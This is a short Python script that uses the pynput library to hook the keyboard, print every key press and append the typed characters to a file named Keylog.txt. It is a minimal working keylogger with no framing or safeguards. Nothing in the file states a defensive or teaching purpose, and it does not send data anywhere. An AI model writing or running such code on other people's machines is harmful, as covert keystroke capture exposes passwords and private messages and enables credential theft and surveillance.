from pynput import keyboard

def Key_is_pressed(key):
    print(str(key))
    with open("Keylog.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error writing")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=Key_is_pressed)
    listener.start()
    input()